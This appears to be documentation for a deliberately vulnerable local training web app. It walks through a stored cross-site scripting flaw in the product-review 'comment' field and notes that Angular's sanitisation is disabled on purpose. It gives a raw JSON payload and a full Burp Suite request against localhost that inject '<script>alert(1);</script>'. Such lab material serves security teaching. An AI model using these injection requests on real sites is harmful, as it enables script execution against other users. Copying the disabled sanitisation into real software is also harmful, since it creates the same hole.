# Stored Cross Site Scripting (XSS)
The stored variant XSS, like other variations, inject scripts into benign, non-attacker controlled websites.  The distinction is stored XSS  _stores_ the injected scripts/code on the server, resulting in the script persisting beyond the current HTTP session.

## Exploitation
**Prerequisites:** _Authenticated, Ordered the Product_

**Location:** _POST /productreviews_

While posting reviews HTML tags, including script, can be specified in the _comment_ parameter. The Angular application is configured to bypass Angular's two primary protections: encoding all interpolated variables and auto-removal of script tags which prevent Stored XSS (or any other XSS).  Below is an exploitation example:

    POST /productreviews
    raw:
    {
    "product" : {"id" : 1},
    "title" : "Disgusting",
    "grade" : 1,
    "comment" : "<script>alert(1);</script>"
    }

To execute the script go to the ProductPage of the review you POSTed to, in our case Product 1 or Vanilla Candle.

Successful exploitation looks like:

    {
        "success": true,
        "code": 200,
        "message": "Success"
    }

## Burp Suite Example Exploitation

    POST /productreviews HTTP/1.1
    Host: 127.0.0.1:8081
    Content-Length: 82
    sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"
    Accept: application/json, text/plain, */*
    Content-Type: application/json
    X-XSRF-TOKEN: 5b2aef5f-69e8-4335-b4ac-d9e02c9545dc
    sec-ch-ua-mobile: ?0
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
    sec-ch-ua-platform: "Windows"
    Origin: http://127.0.0.1:4200
    Sec-Fetch-Site: same-site
    Sec-Fetch-Mode: cors
    Sec-Fetch-Dest: empty
    Referer: http://127.0.0.1:4200/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    Cookie: XSRF-TOKEN=5b2aef5f-69e8-4335-b4ac-d9e02c9545dc; JSESSIONID=37C756F1CE0059619B8EC2FD9FB19AF1
    Connection: close

    {"product":{"id":1},"title":"Disgusting","grade":1,"comment":"<script>alert(1);</script>"}

